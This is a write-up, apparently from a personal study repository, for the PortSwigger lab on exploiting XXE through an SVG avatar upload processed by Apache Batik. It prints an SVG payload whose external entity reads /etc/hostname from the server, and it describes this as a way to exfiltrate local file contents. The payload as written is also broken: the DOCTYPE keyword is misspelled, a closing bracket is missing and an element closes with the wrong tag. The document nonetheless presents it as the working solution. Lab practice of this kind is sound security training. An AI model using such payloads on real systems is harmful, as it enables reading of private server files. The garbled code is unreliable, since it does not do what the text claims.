# Exploiting XXE via image file upload

## 📌 Lab Details
- **Title**: Exploiting XXE via image file upload
- **Difficulty**: Practitioner
- **Category**: XML external entity injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/5d6e610406b1df6c657e111df6297e961a822a0428f00db9f7e7276f4a671a14?referrer=%2fweb-security%2fxxe%2flab-xxe-via-file-upload

## 🔍 Summary
This lab demonstrates how **XXE (XML External Entity)** vulnerabilities can be exploited via image uploads, specifically using an **SVG (XML-based)** image processed by the **Apache Batik library**. By uploading a specially crafted SVG image that references a local file (`/etc/hostname`), the server parses the file and renders its contents as text within the image. You then view the image to extract the hostname and submit it to solve the lab.

## 🛠 Steps to Solve
1. Create a local SVG image with the following content:
   ```sh
   <?xml version="1.0" standalone="yes"?>
   <!DCOTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]
   <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;
   </test>
   </svg>
   ```
2. Post a comment on a blog post, and upload this image as an avatar.
3. When you view your comment, you should see the contents of the `/etc/hostname` file in your image.

## 📖 Key Takeaways
- **SVG files** are XML and can carry XXE payloads.
- The **Apache Batik** library is vulnerable to XXE if not properly configured.
- You can exfiltrate data by rendering local file contents as text in an image.
- No need for an external DTD or collaborator server—everything happens on the server internally.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d62a0bc0-1901-4403-849e-a8902334615c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fb0089c0-1487-4c1e-a629-7117ac4158b3" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7a1d7efa-42c3-4550-8694-8282e47c0985" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9961abab-9b46-4529-8cf7-60011f47d08b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1e3297ec-3790-4815-ab90-8974511dc726" />
